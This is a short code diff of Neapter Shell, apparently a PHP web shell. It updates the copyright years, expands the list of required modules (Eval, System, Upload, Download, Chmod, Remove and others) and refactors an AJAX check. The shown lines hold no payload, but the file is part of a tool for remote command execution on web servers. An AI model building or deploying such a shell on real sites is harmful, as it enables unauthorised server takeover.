@@ -4,25 +4,38 @@
  * Neapter Shell
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
  *
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
 
 /*
-Required modules:
-- Modules
-- Cr3d1ts
-- Help Autoload
-- Evel
-- Cd
-- System
-- Edit
-- Logout
--- Version
--- Upload
--- Info
 
+Required modules:
+- Autoload
+- Cat
+- Cd
+- Chmod
+- Cp
+- Cr3d1ts
+- Download
+- Edit
+- Eval
+- Help
+- Id
+- Info
+- Logout
+- Ls
+- Mkdir
+- Modules
+- Mv
+- Phpinfo
+- Ping
+- Pwd
+- Remove
+- System
+- Upload
+- Version
 */
 
 require_once dirname(__FILE__) . '/Arr.php';
@@ -452,7 +465,7 @@ class Shell
         /**
          * isAjax
          */
-        if (strncasecmp(Request::getServer('HTTP_X_REQUESTED_WITH'), 'XMLHttpRequest', 14) === 0) {
+        if (Request::isAjax()) {
             preg_match('~<pre id="console">(.*)</pre>~s', $sData, $aMatch);
 
             if ($aMatch === array()) {
